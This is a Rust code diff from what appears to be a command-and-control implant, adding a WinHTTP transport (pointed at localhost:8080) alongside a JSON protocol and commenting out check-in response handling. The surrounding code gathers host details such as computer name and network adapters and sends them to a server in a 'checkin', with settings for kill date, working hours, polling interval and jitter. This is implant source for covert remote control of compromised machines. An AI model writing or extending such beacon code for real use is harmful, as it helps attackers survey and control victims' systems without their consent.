@@ -2,8 +2,6 @@ use core::ffi::c_void;
 use libc_print::{libc_eprintln, libc_println};
 use mod_agentcore::{instance, instance_mut};
 
-use mod_protocol_json::protocol::JsonProtocol;
-
 use mod_win32::{
     nt_get_adapters_info::get_adapters_info,
     nt_get_computer_name_ex::{get_computer_name_ex, ComputerNameFormat},
@@ -26,6 +24,12 @@ use rs2_communication_protocol::{
 use rs2_crypt::encryption_algorithm::ident_algorithm::IdentEncryptor;
 
 use crate::commands::{encryptor_from_raw, protocol_from_raw};
+
+#[cfg(feature = "protocol-json")]
+use mod_protocol_json::protocol::JsonProtocol;
+
+#[cfg(feature = "protocol-winhttp")]
+use mod_protocol_winhttp::protocol::WinHttpProtocol;
 
 /// Gathers and initializes metadata such as computer name, OS info, IP addresses, etc.
 pub fn init_checkin_data() {
@@ -127,7 +131,7 @@ pub async fn init_protocol() {
                 let checkin_data = checkin_from_raw(checkin_ptr);
 
                 // Set the protocol to checkin mode
-                protocol.set_is_checkin(true);
+                // protocol.set_is_checkin(true);
 
                 // Attempt to write the Checkin data using the protocol
                 let result = protocol
@@ -136,28 +140,89 @@ pub async fn init_protocol() {
 
                 if result.is_ok() {
                     // If successful, mark the session as connected
-                    instance_mut().session.connected = true;
+                    // instance_mut().session.connected = true;
 
-                    let checkin_response: Result<CheckinResponse, anyhow::Error> =
-                        protocol.read(result.unwrap(), Some(encryptor.clone()));
+                    // let checkin_response: Result<CheckinResponse, anyhow::Error> =
+                    //     protocol.read(result.unwrap(), Some(encryptor.clone()));
 
-                    if checkin_response.is_ok() {
-                        let checkin_response_data = checkin_response.unwrap();
+                    // if checkin_response.is_ok() {
+                    //     let checkin_response_data = checkin_response.unwrap();
 
-                        instance_mut().config.id = checkin_response_data.id;
-                        instance_mut().config.kill_date = checkin_response_data.kill_date;
-                        instance_mut().config.working_hours = checkin_response_data.working_hours;
-                        instance_mut().config.polling_interval =
-                            checkin_response_data.polling_interval;
-                        instance_mut().config.polling_jitter = checkin_response_data.polling_jitter;
+                    //     instance_mut().config.id = checkin_response_data.id;
+                    //     instance_mut().config.kill_date = checkin_response_data.kill_date;
+                    //     instance_mut().config.working_hours = checkin_response_data.working_hours;
+                    //     instance_mut().config.polling_interval =
+                    //         checkin_response_data.polling_interval;
+                    //     instance_mut().config.polling_jitter = checkin_response_data.polling_jitter;
 
-                        libc_println!("Interval: {}", instance().config.polling_interval);
-                    } else {
-                        libc_eprintln!(
-                            "Checkin Response Error: {}",
-                            checkin_response.err().unwrap()
-                        );
-                    }
+                    //     libc_println!("Interval: {}", instance().config.polling_interval);
+                    // } else {
+                    //     libc_eprintln!(
+                    //         "Checkin Response Error: {}",
+                    //         checkin_response.err().unwrap()
+                    //     );
+                    // }
+                } else {
+                    libc_eprintln!("Error: {}", result.err().unwrap());
+                }
+            } else {
+                // Handle error if Checkin data is null (currently commented out)
+                libc_eprintln!("Error: Checkin data is null");
+            }
+        }
+    }
+    #[cfg(feature = "protocol-winhttp")]
+    {
+        let boxed_encryptor = Box::new(IdentEncryptor);
+        let boxed_protocol: Box<WinHttpProtocol<IdentEncryptor>> =
+            Box::new(WinHttpProtocol::new("http://localhost:8080".to_string()));
+
+        unsafe {
+            instance_mut().session.encryptor_ptr = Box::into_raw(boxed_encryptor) as *mut c_void;
+            instance_mut().session.protocol_ptr = Box::into_raw(boxed_protocol) as *mut c_void;
+        }
+
+        unsafe {
+            let encryptor = encryptor_from_raw(instance().session.encryptor_ptr);
+            let protocol = protocol_from_raw(instance().session.protocol_ptr);
+
+            // Check if the Checkin data is available in the global instance
+            if let Some(checkin_ptr) = instance().pcheckindata.as_mut() {
+                // Convert the raw pointer to a mutable reference to Checkin
+                let checkin_data = checkin_from_raw(checkin_ptr);
+
+                // Set the protocol to checkin mode
+                // protocol.set_is_checkin(true);
+
+                // Attempt to write the Checkin data using the protocol
+                let result = protocol
+                    .write(checkin_data.clone(), Some(encryptor.clone()))
+                    .await;
+
+                if result.is_ok() {
+                    // If successful, mark the session as connected
+                    // instance_mut().session.connected = true;
+
+                    // let checkin_response: Result<CheckinResponse, anyhow::Error> =
+                    //     protocol.read(result.unwrap(), Some(encryptor.clone()));
+
+                    // if checkin_response.is_ok() {
+                    //     let checkin_response_data = checkin_response.unwrap();
+
+                    //     instance_mut().config.id = checkin_response_data.id;
+                    //     instance_mut().config.kill_date = checkin_response_data.kill_date;
+                    //     instance_mut().config.working_hours = checkin_response_data.working_hours;
+                    //     instance_mut().config.polling_interval =
+                    //         checkin_response_data.polling_interval;
+                    //     instance_mut().config.polling_jitter = checkin_response_data.polling_jitter;
+
+                    //     libc_println!("Interval: {}", instance().config.polling_interval);
+                    // } else {
+                    //     libc_eprintln!(
+                    //         "Checkin Response Error: {}",
+                    //         checkin_response.err().unwrap()
+                    //     );
+                    // }
                 } else {
                     libc_eprintln!("Error: {}", result.err().unwrap());
                 }
